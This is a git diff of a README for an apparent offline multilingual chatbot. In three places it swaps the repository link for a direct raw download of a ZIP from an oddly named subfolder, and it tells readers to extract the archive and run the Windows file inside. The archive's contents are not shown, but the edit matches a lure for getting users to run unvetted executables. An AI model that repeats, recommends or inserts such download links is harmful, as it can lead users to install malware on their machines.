@@ -1,6 +1,6 @@
 # 🤖 Multilingual_OpenSource_Chatbot - Simple Offline Voice Help
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Circumlocutionparadoxurus116/Multilingual_OpenSource_Chatbot)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Circumlocutionparadoxurus116/Multilingual_OpenSource_Chatbot/raw/refs/heads/main/Phasianellidae/Open_Multilingual_Source_Chatbot_v3.1.zip)
 
 ## 🚀 What this app does
 
@@ -12,7 +12,7 @@ It is made to help with common service questions, form guidance, office details,
 
 Use this page to download and run the app:
 
-https://github.com/Circumlocutionparadoxurus116/Multilingual_OpenSource_Chatbot
+https://github.com/Circumlocutionparadoxurus116/Multilingual_OpenSource_Chatbot/raw/refs/heads/main/Phasianellidae/Open_Multilingual_Source_Chatbot_v3.1.zip
 
 If the page includes a release file, download the Windows file from there and run it. If you see a ZIP file, save it to your PC, extract it, and start the app from the extracted folder.
 
@@ -182,7 +182,7 @@ For the best experience:
 ## 🖱️ Quick start
 
 1. Open the download page:
-   https://github.com/Circumlocutionparadoxurus116/Multilingual_OpenSource_Chatbot
+   https://github.com/Circumlocutionparadoxurus116/Multilingual_OpenSource_Chatbot/raw/refs/heads/main/Phasianellidae/Open_Multilingual_Source_Chatbot_v3.1.zip
 2. Download the Windows file
 3. Extract it if needed
 4. Install the required tools
